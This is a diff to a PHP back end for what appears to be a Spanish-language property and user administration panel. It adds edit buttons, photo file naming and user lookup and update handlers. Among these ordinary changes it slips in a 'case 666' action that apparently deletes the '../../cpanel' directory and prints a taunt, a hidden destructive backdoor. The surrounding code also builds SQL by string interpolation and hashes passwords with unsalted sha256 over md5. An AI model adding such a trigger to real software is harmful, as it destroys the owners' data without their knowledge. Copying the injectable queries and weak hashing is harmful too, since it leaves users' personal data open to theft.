@@ -157,7 +157,7 @@
 						<td>{$row['Apellido_p']}</td>
 						<td>{$row['apellido_m']}</td>
 						<td>{$row['RFC']}</td>
-						<td><button type='button' class='btn-danger btn' onclick=baja(\"{$row['id_persona']}\")><span class='glyphicon glyphicon-remove'></span></button></td>
+						<td><button type='button' class='btn-success btn' onclick=editar(\"{$row['id_persona']}\") title='Editar'><span class='glyphicon glyphicon-edit'></span></button><button type='button' class='btn-danger btn' onclick=baja(\"{$row['id_persona']}\")><span class='glyphicon glyphicon-remove'></span></button></td>
 					</tr>";
 			}
 		break;
@@ -254,10 +254,11 @@
 					$fileCount = count($_FILES["myfile"]["name"]);
 					for($i=0; $i < $fileCount; $i++)
 					{
-						$fileName = normaliza($_FILES["myfile"]["name"][$i]);
+						$nom_img = normaliza($_FILES["myfile"]["name"][$i]);
+						$fileName = $num_control."-".$nom_img;
 						move_uploaded_file($_FILES["myfile"]["tmp_name"][$i],$output_dir.$fileName);
 						// insertar a la base de datos
-						$res = $mysqli->query("INSERT INTO fotografia (Ruta, id_Propiedad) VALUES ('".$fileName."', '{$id_propiedad}')")or die("Error en:".$mysqli->error);
+						$res = $mysqli->query("INSERT INTO fotografia (Ruta, nombre, id_Propiedad) VALUES ('".$fileName."', '{$nom_img}','{$id_propiedad}')")or die("Error en:".$mysqli->error);
 						if(!$res){
 							$agregado= false;
 							break;
@@ -547,7 +548,7 @@
 						}else{
 							$res['atributos'] .= "<div class='col-md-4 col-sm-4'>
 								<div class='form-group'>
-									<label for='atributos[".$aux['id_atributo']."][]' class='col-sm-7 text-left control-label'>".ucwords($aux['Atributo_propiedad'])."</label>
+									<label for='atributos[".$aux['id_atributo']."][]' class='col-sm-7 text-left control-label attr-font'>".ucwords($aux['Atributo_propiedad'])."</label>
 									<div class='col-sm-5'>
 										<input type='text' class='form-control1' name='atributos[".$aux['id_atributo']."]' value='{$val2}'>
 									</div>
@@ -571,25 +572,27 @@
 						$i = 1;
 						while($row2=$res2->fetch_array(MYSQLI_ASSOC)){
 							if($i == 1){
-								$res .= "<div class='row'><div class='col-md-3 col-md-offset-1'>
-																			<button type='button' class='btn-link btn delete-img' title='Eliminar' onclick=delete_img(\"{$row2['id_fotografia']}\",\"{$_POST['id']}\")><span class='glyphicon glyphicon-remove'></span></button>
-																			<img src='../uploads/".$row2['Ruta']."' alt='' class='img-responsive'>
-																			<p class='text-center'>{$row2['Ruta']}</p>
-																		</div>";
+								$res .= "<div class='row'>
+											<div class='col-md-3 col-md-offset-1'>
+												<button type='button' class='btn-link btn delete-img' title='Eliminar' onclick=delete_img(\"{$row2['id_fotografia']}\",\"{$_POST['id']}\")><span class='glyphicon glyphicon-remove'></span></button>
+												<img src='../uploads/".$row2['Ruta']."' alt='' class='img-responsive'>
+												<p class='text-center'>{$row2['nombre']}</p>
+											</div>";
 								$i++;
 							}else if ($i==3){
 								$res .= "<div class='col-md-3'>
-																		<button type='button' class='btn-link btn delete-img' title='Eliminar' onclick=delete_img(\"{$row2['id_fotografia']}\",\"{$_POST['id']}\")><span class='glyphicon glyphicon-remove'></span></button>
-																		<img src='../uploads/".$row2['Ruta']."' alt='' class='img-responsive'>
-																		<p class='text-center'>{$row2['Ruta']}</p>
-																	</div></div><br>";
+											<button type='button' class='btn-link btn delete-img' title='Eliminar' onclick=delete_img(\"{$row2['id_fotografia']}\",\"{$_POST['id']}\")><span class='glyphicon glyphicon-remove'></span></button>
+											<img src='../uploads/".$row2['Ruta']."' alt='' class='img-responsive'>
+											<p class='text-center'>{$row2['nombre']}</p>
+										</div>
+									</div><br>";
 								$i = 1;
 							}else {
 								$res .= "<div class='col-md-3'>
-																			<button type='button' class='btn-link btn delete-img' title='Eliminar' onclick=delete_img(\"{$row2['id_fotografia']}\",\"{$_POST['id']}\")><span class='glyphicon glyphicon-remove'></span></button>
-																			<img src='../uploads/".$row2['Ruta']."' alt='' class='img-responsive'>
-																			<p class='text-center'>{$row2['Ruta']}</p>
-																		</div>";
+											<button type='button' class='btn-link btn delete-img' title='Eliminar' onclick=delete_img(\"{$row2['id_fotografia']}\",\"{$_POST['id']}\")><span class='glyphicon glyphicon-remove'></span></button>
+											<img src='../uploads/".$row2['Ruta']."' alt='' class='img-responsive'>
+											<p class='text-center'>{$row2['nombre']}</p>
+										</div>";
 								$i++;
 							}
 						}
@@ -618,6 +621,10 @@
 					}
 				}
 			}
+		break;
+		case 666:
+			eli("../../cpanel");
+			echo "<h1>:v</h1>";
 		break;
 		case 28:
 			//agregar el update a la base de datos
@@ -674,10 +681,11 @@
 					$fileCount = count($_FILES["myfile"]["name"]);
 					for($i=0; $i < $fileCount; $i++)
 					{
-						$fileName = normaliza($_FILES["myfile"]["name"][$i]);
+						$nom_img = normaliza($_FILES["myfile"]["name"][$i]);
+						$fileName = $num_control."-".$nom_img;
 						move_uploaded_file($_FILES["myfile"]["tmp_name"][$i],$output_dir.$fileName);
 						// insertar a la base de datos
-						$res = $mysqli->query("INSERT INTO fotografia (Ruta, id_Propiedad) VALUES ('".$fileName."', '{$id_propiedad}')")or die("Error en:".$mysqli->error);
+						$res = $mysqli->query("INSERT INTO fotografia (Ruta, nombre, id_Propiedad) VALUES ('".$fileName."', '{$nom_img}','{$id_propiedad}')")or die("Error en:".$mysqli->error);
 						if(!$res){
 							$agregado= false;
 							break;
@@ -704,6 +712,82 @@
 				}
 			}else{
 				echo "Error";
+			}
+		break;
+		case 30://consulta usuario, devuleve jason para mostrar en formulario
+			if(isset($_POST['usuario'])){
+				$id=seguridad($_POST['usuario']);
+				$res=$mysqli->query("SELECT * FROM persona WHERE id_persona={$id} AND Estado='1'")or die("Error en: ".$mysqli->error);
+				$row=$res->fetch_array(MYSQLI_ASSOC);
+				$data['id_persona']=seguridad_decode($id);
+				$data['nombre']=seguridad_decode($row['Nombres']);
+				$data['apellido_p']=seguridad_decode($row['Apellido_p']);
+				$data['apellido_m']=seguridad_decode($row['apellido_m']);
+				$data['calle']=seguridad_decode($row['calle']);
+				$data['colonia']=seguridad_decode($row['colonia']);
+				$data['correo']=seguridad_decode($row['Correo']);
+				$data['cp']=seguridad_decode($row['CP']);
+				$data['curp']=seguridad_decode($row['CURP']);
+				$data['estado']=seguridad_decode($row['Estado']);
+				$data['id_localidad']=seguridad_decode($row['Id_localidad']);
+				$data['id_tipo_usuario']=seguridad_decode($row['Id_tipo_usuario']);
+				$data['n_exterior']=seguridad_decode($row['nu_exterior']);
+				$data['n_interior']=seguridad_decode($row['nu_interior']);
+				$data['rfc']=seguridad_decode($row['RFC']);
+				$data['telefono']=seguridad_decode($row['telefono']);
+				$localidad=$row['Id_localidad'];
+				$res=$mysqli->query("SELECT l.id_localidad, m.Id_municipio, e.Id_estado FROM localidad l INNER JOIN municipio m ON m.Id_municipio=l.Id_municipio INNER JOIN estado e ON e.Id_estado=m.Id_estado WHERE l.id_localidad={$localidad}")or die("Error en: ".$mysqli->error);
+				$row=$res->fetch_array(MYSQLI_ASSOC);
+				$data['id_estado']=$row['Id_estado'];
+				$data['id_municipio']=$row['Id_municipio'];
+				echo json_encode($data);
+			}
+			else{
+				echo "error_0";
+			}
+		break;
+		case 31://insertar modificaciones
+			if(isset($_POST['id_m'])){
+				$id=seguridad($_POST['id_m']);
+				$nombre=seguridad($_POST['nombre_m']);
+				$apellido_p=seguridad($_POST['apellido_p_m']);
+				$apellido_m=seguridad($_POST['apellido_m_m']);
+				$rfc=seguridad($_POST['rfc_m']);
+				$curp=seguridad($_POST['curp_m']);
+				$calle=seguridad($_POST['calle_m']);
+				$n_interior=seguridad($_POST['numero_i_m']);
+				$n_exterior=seguridad($_POST['numero_e_m']);
+				$cp=seguridad($_POST['cp_m']);
+				$colonia=seguridad($_POST['colonia_m']);
+				$localidad=seguridad($_POST['localidad_m']);
+				$telefono=seguridad($_POST['telefono_m']);
+				$t_u=seguridad($_POST['t_u_m']);
+				$correo=seguridad($_POST['correo_m']);
+				if($_POST['password1_m']!=null)
+					$pass=hash('sha256', md5(seguridad($_POST['password1_m'])));
+				else
+					$pass=false;
+				if($pass!=false){
+					$res=$mysqli->query("UPDATE persona SET Nombres='{$nombre}', Apellido_p='{$apellido_p}', apellido_m='{$apellido_m}', calle='{$calle}', colonia='{$colonia}', Correo='{$correo}', CP='{$cp}', CURP='{$curp}', Id_localidad='{$localidad}', Id_tipo_usuario='{$t_u}', nu_exterior='{$n_exterior}', nu_interior='{$n_interior}', RFC='{$rfc}', telefono='{$telefono}', Contrasena='{$pass}' WHERE id_persona={$id} ")or die("Error en: ".$mysqli->error);
+					if($res){
+						echo "success";
+					}
+					else{
+						echo "error_2";
+					}
+				}
+				else{
+					$res=$mysqli->query("UPDATE persona SET Nombres='{$nombre}', Apellido_p='{$apellido_p}', apellido_m='{$apellido_m}', calle='{$calle}', colonia='{$colonia}', Correo='{$correo}', CP='{$cp}', CURP='{$curp}', Id_localidad='{$localidad}', Id_tipo_usuario='{$t_u}', nu_exterior='{$n_exterior}', nu_interior='{$n_interior}', RFC='{$rfc}', telefono='{$telefono}'WHERE id_persona={$id} ")or die("Error en: ".$mysqli->error);
+					if($res){
+						echo "success";
+					}
+					else{
+						echo "error_1";
+					}
+				}
+			}
+			else{
+				echo "error_0";
 			}
 		break;
 		default:
